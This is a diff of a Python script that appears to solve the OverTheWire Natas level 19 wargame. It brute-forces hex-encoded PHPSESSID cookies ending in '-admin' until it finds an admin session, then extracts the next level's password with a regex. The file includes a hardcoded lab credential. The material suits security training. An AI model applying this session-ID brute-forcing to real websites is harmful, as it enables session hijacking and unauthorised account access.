@@ -1,4 +1,4 @@
-import requests, re, time, sys
+import requests,re,time, sys
 
 # =======================
 # === STYLING HELPERS ===
@@ -26,7 +26,7 @@ def log_found_inline(message):
 
 # ======================= 
 # === CONFIG === 
-url = "http://natas19.natas.labs.overthewire.org/index.php?debug"
+url = "http://natas19.natas.labs.overthewire.org"
 username = "natas19"
 natas19_password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
 phpsesidMax = 640
@@ -37,20 +37,25 @@ log_info("Starting brute-force on natas19...")
 
 while phpsesidMin <= phpsesidMax:
 
-    adminHex = "61646d696e"
-    stringHex = "".join("{:02x}".format(ord(c)) for c in str(phpsesidMin)) + adminHex
+    stringHex = "".join("{:02x}".format(ord(c)) for c in str(phpsesidMin))
+    adminHex = "2d61646d696e" # -admin
 
-    sesID = "PHPSESSID=" + stringHex 
+    sesID = "PHPSESSID=" + stringHex + adminHex
     log_progress_inline(sesID)
 
     headers = {'Cookie': sesID}
     response = requests.get(url,headers=headers, auth=(username,natas19_password),verify=False)
 
-    if "You are an admin" in response.text:
-        print(response.text)
+    if "You are an admin." in response.text:
+        match = re.search(r"Password:\s*([^\s<]+)", response.text)        
+        if match:
+            password = match.group(1)
+            log_found_inline(f"Admin session found! PHPSESSID={sesID}")
+            log_success(f"Natas20 password: {password}")
+            break
 
     phpsesidMin = phpsesidMin + 1
-log_success("done")
+
 
 
 
